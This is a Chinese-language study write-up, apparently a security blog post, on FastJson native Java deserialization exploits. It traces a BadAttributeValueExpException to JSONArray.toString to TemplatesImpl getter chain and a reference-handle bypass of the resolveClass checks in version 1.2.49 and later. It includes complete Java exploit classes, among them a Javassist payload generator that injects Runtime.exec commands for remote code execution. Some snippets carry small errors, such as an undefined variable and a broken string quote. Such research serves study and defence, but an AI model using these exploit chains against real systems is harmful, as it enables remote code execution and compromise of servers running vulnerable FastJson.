# Java反序列化之FastJson原生反序列化

## FastJson<=1.2.48

### 引入：

  * 在之前我们学习了FastJson中通过parseObject和parse通过@ type来加载类，通过getter或者是setter方法作为入口进行调用，一个是通过JNDI注入进行出网攻击，另一个是通过defineClass的动态类加载，来进行不出网攻击。并且提到了AutoType的绕过。

  * 但是这里我们在最初学习Java反序列化的时候，是通过继承serialzable接口，反序列化调用readObject方法来进行的，和上面的思维又是不一样的，所以我们就来看一下FastJson中原生反序列化的漏洞：

### 利用类查找：

  * 既然是原生反序列化，我们就要在FastJson包里面找到继承Serializable接口的类，最后锁定的是这两个类：`JSONObject`和`JSONArray`类：

![](./img/7264493866727800440.png)

![](./img/4855164815023771841.png)

这里我们来介绍一下JSONArray类的利用方式：

首先我们要找到入口点，就是readObject方法，但是我们却发现`JSONArray`中并不存在`readObject`方法，并且他`extends`对应的`JSON`类也没有readObect方法，所以这里我们只有通过其他类的readObject方法来触发JSONArray或者JSON的某个方法来实现调用链。

这里我们就要引入toString方法，我们可以发现在Json类中存在toString方法能够触发toJSONString方法的调用。然后我们再来探索一下

如果可以触发getter方法，就能够进行进一步的调用链：

### toJSONString触发getter方法：

  * 在上一个文章当中我们已经跟过了parseObject对应的getter和setter调用流程，因此我们在反序列化的时候就是通过parseObject调用getter和setter来进行的攻击，这里我们就来探索一下toString中的toJSONString方法能不能来调用get方法：

  * 我们准备一个Demo测试一下：

    
    
    package JavaBeanTest;
    
    public class Person {
        private String name;
        public String getName() {
            System.out.println("getName");
            return name;
        }
        public void setName(String name) {
            System.out.println("setName");
            this.name = name;
        }
    }
    
    
    
    package JavaBeanTest;
    import com.alibaba.fastjson.JSON;
    
    public class BeanTest {
    
        public static void main(String[] args) throws Exception{
            Person person = new Person();
            String JSON_Serialize = JSON.toJSONString(person);
            System.out.println(JSON_Serialize);
        }
    }
    
    //getName
    //{}
    

  * 我们可以发现这里调用了JSON里面的toJSONString方法后，调用了Person类中的getter方法，我们来跟进一下看看怎么回事：

  * 在`String JSON_Serialize = JSON.toJSONString(person);`下断点，进入以后：

![](./img/4537091751114188648.png)

  * 再一层层调用以后，最后在toJSONString中调用了serializer.write方法

![](./img/4419061951597784837.png)

  * 然后在writer.write里面，在ASM中的跟进不是特别好跟，一路步入以后就调用了getName方法，这里我们主要了解toJSONString能够调用getter方法为目的：

![](./img/1681779535481230791.png)

所以我们的思路就非常明确了，找到一个能够readObject的类，调用toString方法，然后调用toJSONString方法，再调用getter，实现反序列化利用。

### 调用链：

很容易可以想到CC链中存在BadAttributeValueExpExeption中的readObject方法能够触发toString方法：

![](./img/4266948313127409555.png)

然后我们就很容易想到在Shiro反序列化中利用JavaBean特性调用Templatelmpl里面的getOutputProperty方法，调用newTransformer，最后通过动态类加载实现RCE：

### 优化EXP(Template)：

    
    
    package EXPFastJson;
    import com.alibaba.fastjson.JSONArray;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
    import javax.management.BadAttributeValueExpException;
    import java.io.*;
    import java.lang.reflect.Field;
    import java.nio.file.Files;
    import java.nio.file.Paths;
    import java.io.ByteArrayInputStream;
    import java.io.ByteArrayOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    
    public class FastJsontoString {
        public static void setValue(Object obj, String name, Object value) throws Exception{
            Field field = obj.getClass().getDeclaredField(name);
            field.setAccessible(true);
            field.set(obj, value);
        }
    
        public static void main(String[] args) throws Exception{
    
            TemplatesImpl templatesimpl = new TemplatesImpl();
            byte[] bytecodes = Files.readAllBytes(Paths.get("D:\\Tomcat\\CC\\target\\classes\\EXPFastJson\\DemotoString.class"));
            setValue(templatesimpl,"_name","aaa");
            setValue(templatesimpl,"_bytecodes",new byte[][] {bytecodes});
            setValue(templatesimpl, "_tfactory", new TransformerFactoryImpl());
    
    
            JSONArray jsonArray= new JSONArray();
            jsonArray.add(templates);
    
    
            BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
            Class Bv = Class.forName("javax.management.BadAttributeValueExpException");
            Field val = Bv.getDeclaredField("val");
            val.setAccessible(true);
            val.set(badAttributeValueExpException,jsonArray);
    
    
            ByteArrayOutputStream barr = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr);
            objectOutputStream.writeObject(badAttributeValueExpException);
            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
            Object o = (Object)ois.readObject();
        }
    
    }
    

## FastJson1.2.49绕过:

FastJson从1.2.49开始，我们的JSONArray以及JSONObject方法开始真正有了自己的readObject方法，同时在`SecureObjectInputStream`类当中重写了`resolveClass`,通过调用了`checkAutoType`方法做类的检查：

![](./img/1815130861996998133.png)

### 防护过程：

其实这个反序列化的过程就是这样的，因为他的底层是不安全的，所以相当于在上层套了层层waf来进行防护，所以才会有绕过的可能性:

    
    
    ObjectInputStream -> readObject -> SecureObjectInputStream -> readObject -> resolveClass
    

而正常安全的反序列化过程是直接在继承ObjectInputStream类中重写resolveClass：

    
    
    TestInputStream -> readObject -> resolveClass
    

具体的resolveClass调用过程可以去看Y4师傅的博客

### 绕过:

  * 所以我们的重点就是如何在JSONArray/JSONObject对象反序列化恢复对象时，让我们的恶意类成为引用类型从而绕过resolveClass的检查
  * 当向List、set、map类型中添加同样对象时即可成功利用，当我们写入对象时，会在`handles`这个哈希表中建立从对象到引用的映射,当再次写入同一对象时，在`handles`这个hash表中查到了映射，那么就会通过`writeHandle`将重复对象以引用类型写入

    
    
    ArrayList<Object> arrayList = new ArrayList<>();
    arrayList.add(templates);
    arrayList.add(templates);
    writeObjects(arrayList);
    

### EXP：

这里学到了y4师傅直接利用代码创建恶意类的字节码的姿势，之前都是本地引入恶意类：

    
    
    public static byte[] genPayload(String cmd) throws Exception{
            ClassPool pool = ClassPool.getDefault();
            CtClass clazz = pool.makeClass("a");
            CtClass superClass = pool.get(AbstractTranslet.class.getName());
            clazz.setSuperclass(superClass);
            CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
            constructor.setBody("Runtime.getRuntime().exec(\""+cmd+"");");
            clazz.addConstructor(constructor);
            clazz.getClassFile().setMajorVersion(49);
            return clazz.toBytecode();
        }
    
    
    
    package EXPFastJson;
    import com.alibaba.fastjson.JSONArray;
    import javax.management.BadAttributeValueExpException;
    import java.io.*;
    import java.lang.reflect.Field;
    import java.util.HashMap;
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import javassist.ClassPool;
    import javassist.CtClass;
    import javassist.CtConstructor;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    
    
    public class FastJsonAll {
        public static void setValue(Object obj, String name, Object value) throws Exception{
            Field field = obj.getClass().getDeclaredField(name);
            field.setAccessible(true);
            field.set(obj, value);
        }
    
        public static byte[] genPayload(String cmd) throws Exception{
            ClassPool pool = ClassPool.getDefault();
            CtClass clazz = pool.makeClass("a");
            CtClass superClass = pool.get(AbstractTranslet.class.getName());
            clazz.setSuperclass(superClass);
            CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
            constructor.setBody("Runtime.getRuntime().exec(\""+cmd+"");");
            clazz.addConstructor(constructor);
            clazz.getClassFile().setMajorVersion(49);
            return clazz.toBytecode();
        }
    
        public static void main(String[] args) throws Exception{
    
    
            TemplatesImpl templates = TemplatesImpl.class.newInstance();
            setValue(templates, "_bytecodes", new byte[][]{genPayload("Calc")});
            setValue(templates, "_name", "1");
            setValue(templates, "_tfactory", null);
    
            JSONArray jsonArray = new JSONArray();
            jsonArray.add(templates);
    
            BadAttributeValueExpException bd = new BadAttributeValueExpException(null);
            setValue(bd,"val",jsonArray);
    
            HashMap hashMap = new HashMap();
            hashMap.put(templates,bd);
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(hashMap);
            objectOutputStream.close();
    
            ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));
            objectInputStream.readObject();
    
    
    
        }
    }
    

### 调试：

我们可以发现在secureObjectInputStream处理完以后，得到的secIn里面的handles对应的hash表中找到了第二次引用TemplatesImpl，通过readHandle恢复对象的途中不会触发resolveClass，由此实现了绕过

![](./img/180475632567897788.png)

而我们之前对应的利用链就可以明显的看到这里只有BadAttributeValueExpException对象的一个引用类型，并没有第二次对Templateslmpl对象进行恢复，所以会进入resolveClass中

![](./img/7588563375342493278.png)

### 利用流程：

这里不安全的原因就是利用了两次readObject方法，所以我们可以恢复对象进行两次恢复，这样就可以绕过resolveClass的检测。

    
    
    ObjectInputStream -> readObject -> SecureObjectInputStream -> readObject -> resolveClass

  * 所以我们的思路就是，在序列化的时候将templates先加入到arrayList中，然后在JSONArray中再加入Templateslmpl，由于在handles这个hash表中查到了映射，后续就会以引用的形式进行输出。
  * 在反序列化的过程当中，因为我们引入了Map类型，第一个readObject方法先将template进行一次恢复，然后再恢复`BadAttributeValueExpException`对象，而在恢复BadAttributeValueExpException对象的过程中，因为我们传入了val对应的JSONArray/JSONObject对象，所以会触发第二个readObject方法，将这个过程在给SecrueObjectInputStream处理，因为我们这是第二次恢复Templateslmpl对象，所以是引用类型，通过readHandle哈希表的时候不会触发resolveClass，从而实现了绕过。

![](./img/2772265981793277518.png)

参考文章：

<https://boogipop.com/2023/03/02/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#FastJson-toString%E9%93%BE>

<https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/#%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B>

<https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#fastjson2>

